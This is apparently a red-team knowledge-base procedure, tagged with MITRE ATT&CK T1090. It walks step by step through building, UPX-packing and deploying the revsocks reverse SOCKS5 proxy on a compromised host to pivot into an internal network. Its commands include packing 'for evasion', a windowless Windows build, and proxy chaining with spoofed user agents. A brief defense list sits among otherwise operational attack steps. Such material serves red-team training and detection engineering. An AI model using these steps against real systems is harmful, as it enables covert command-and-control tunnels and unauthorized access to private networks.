---
id: 96f8e7e4-343c-4701-81f1-d8a5ae47c20c
name: Reverse-SOCKS-Proxy-Pivoting
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:22.931394Z'
updated_at: '2023-04-10T20:25:18.370260Z'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Connection Proxy|T1090 - Connection Proxy]]'
sub_techniques: []
tags:
  - '[[tags/Network Pivoting Techniques]]'
  - '[[tags/revsocks]]'
commands:
  - '[[commands/git-clone-revsocks-repo]]'
  - '[[commands/set-gopath-environment]]'
  - '[[commands/go-get-yamux-package]]'
  - '[[commands/go-get-go-socks5-package]]'
  - '[[commands/go-get-go-ntlmssp-package]]'
  - '[[commands/go-build-revsocks-linux]]'
  - '[[commands/upx-compress-revsocks-linux]]'
  - '[[commands/go-build-revsocks-windows]]'
  - '[[commands/go-build-revsocks-windows-gui]]'
  - '[[commands/upx-compress-revsocks-windows]]'
  - '[[commands/revsocks-listen-create-socks-proxy]]'
  - '[[commands/revsocks-connect-client-basic]]'
  - '[[commands/revsocks-connect-client-with-proxy]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/revsocks]]'
validated: true
---

# Reverse-SOCKS-Proxy-Pivoting

## Summary

This procedure outlines how to build and deploy a reverse SOCKS5 proxy using the revsocks tool on a compromised host to pivot into a target network. It enables attackers to tunnel traffic through the compromised machine, bypassing firewalls and network restrictions for further command and control operations.

## Description

Reverse SOCKS proxy pivoting involves configuring a reverse proxy on a compromised host that listens for incoming connections from the attacker's machine. Once connected, the proxy forwards traffic to internal network resources, allowing the attacker to access otherwise unreachable systems. This technique is particularly useful in environments with strict outbound firewall rules, as the compromised host acts as a bridge. The revsocks tool, written in Go, supports authentication, proxy chaining, and custom user agents to evade detection. It maps to MITRE ATT&CK technique T1090 (Connection Proxy) under the Command and Control tactic.

## Requirements

1. Access to a compromised host with outbound internet connectivity and the ability to execute binaries.
2. Go development environment installed on the attacker's machine (version 1.16 or later).
3. UPX packer installed for executable compression (optional but recommended for evasion).
4. Attacker-controlled server (VPS) with a public IP for listening.
5. Basic network knowledge to configure ports and proxies.

## Defense

- Monitor network traffic for suspicious connections to non-standard ports like 8443 or 1080.
- Implement network segmentation to isolate compromised hosts and limit lateral movement.
- Use multi-factor authentication and least-privilege access to prevent initial compromise.
- Deploy endpoint detection tools to identify unusual binary executions like revsocks.
- Log and analyze proxy authentication attempts and anomalous SOCKS traffic.

## Objectives

1. Build the revsocks binary for deployment on target platforms (Linux/Windows).
2. Deploy and configure the reverse SOCKS proxy on the compromised host.
3. Establish a pivoting connection from the attacker's machine to access internal resources.
4. Enable traffic forwarding through the proxy for further network exploration.

## Instructions

### Step 1: Clone the Revsocks Repository

**Context**: Obtain the source code for the revsocks tool from its GitHub repository to begin the build process.

**Command** ([[commands/git-clone-revsocks-repo]]):
```bash
git clone https://github.com/kost/revsocks
```

> This clones the repository into the current directory. Expected output includes progress messages and confirmation of the clone completion. Navigate into the cloned directory afterward.

### Step 2: Set GOPATH Environment Variable

**Context**: Configure the Go workspace path required for dependency management during the build.

**Command** ([[commands/set-gopath-environment]]):
```bash
export GOPATH=~/go
```

> This sets the GOPATH for the current session. Verify with `echo $GOPATH`. No output if successful; use `source` if in a script.

### Step 3: Install Required Go Packages

**Context**: Fetch the necessary dependencies (yamux for multiplexing, go-socks5 for SOCKS handling, go-ntlmssp for NTLM authentication) to compile revsocks.

**Command** ([[commands/go-get-yamux-package]]):
```bash
go get github.com/hashicorp/yamux
```

> Installs the yamux package. Expected output: download progress and successful installation message.

**Command** ([[commands/go-get-go-socks5-package]]):
```bash
go get github.com/armon/go-socks5
```

> Installs the go-socks5 package. Expected output: download progress and successful installation.

**Command** ([[commands/go-get-go-ntlmssp-package]]):
```bash
go get github.com/kost/go-ntlmssp
```

> Installs the go-ntlmssp package. Expected output: download progress and successful installation.

### Step 4: Build Revsocks for Linux

**Context**: Compile the revsocks binary targeted for Linux deployment on the compromised host.

**Command** ([[commands/go-build-revsocks-linux]]):
```bash
go build -ldflags="-s -w"
```

> Builds the executable with stripped symbols for size reduction. Expected output: no errors, generates `revsocks` binary. Verify with `ls -la revsocks`.

**Command** ([[commands/upx-compress-revsocks-linux]]):
```bash
upx --brute revsocks
```

> Compresses the binary using UPX for evasion. Expected output: compression statistics showing reduced file size.

### Step 5: Build Revsocks for Windows

**Context**: Cross-compile the binary for Windows if the target is a Windows host.

**Command** ([[commands/go-build-revsocks-windows]]):
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
```

> Builds the Windows executable with optimizations. Expected output: generates `revsocks.exe`. If cross-compilation fails, ensure Go is configured for it.

**Command** ([[commands/go-build-revsocks-windows-gui]]):
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-H=windowsgui"
```

> Builds a GUI version to suppress console windows. Expected output: generates another `revsocks.exe` variant.

**Command** ([[commands/upx-compress-revsocks-windows]]):
```bash
upx revsocks.exe
```

> Compresses the Windows binary. Expected output: compression report.

### Step 6: Deploy and Start the Reverse SOCKS Proxy on Compromised Host

**Context**: Transfer the built binary to the compromised host and start the listener to create the SOCKS5 proxy.

**Command** ([[commands/revsocks-listen-create-socks-proxy]]):
```bash
./revsocks -listen :8443 -socks 127.0.0.1:1080 -pass Password1234
```

> Runs on the VPS or compromised host. Expected output: listener started, SOCKS proxy bound to port 1080. The tool will wait for connections.

### Step 7: Connect Client to the Proxy (Basic)

**Context**: From the attacker's machine, connect to the reverse proxy to establish the pivot tunnel.

**Command** ([[commands/revsocks-connect-client-basic]]):
```bash
./revsocks -connect <server_ip>:8443 -pass Password1234
```

> Replace <server_ip> with the compromised host's IP. Expected output: successful authentication and tunnel establishment. Traffic can now be routed via the proxy.

### Step 8: Connect Client with Upstream Proxy (Advanced)

**Context**: If the attacker is behind a corporate proxy, chain through it for additional evasion.

**Command** ([[commands/revsocks-connect-client-with-proxy]]):
```bash
./revsocks -connect <server_ip>:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/username:password -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> Uses proxy chaining with auth and custom UA. Expected output: connection via proxy, tunnel active. Test by configuring a browser or tool to use localhost:1080 as SOCKS proxy.
